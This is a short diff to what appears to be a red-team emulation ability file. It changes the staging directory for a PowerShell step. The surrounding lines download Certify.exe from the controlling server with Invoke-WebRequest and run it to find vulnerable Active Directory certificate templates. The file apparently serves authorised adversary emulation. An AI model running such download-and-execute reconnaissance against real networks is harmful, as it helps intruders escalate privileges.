@@ -9,7 +9,7 @@
     windows:
       psh:
         command: |
-          cd "C:\Users\Public";
+          cd "#{env.dir.stage}";
           Invoke-WebRequest -Uri "#{server}/file/download" -Method POST -Headers @{"file" = "Certify.exe"} -OutFile "Certify.exe";
           .\Certify.exe find /vulnerable
         parsers:
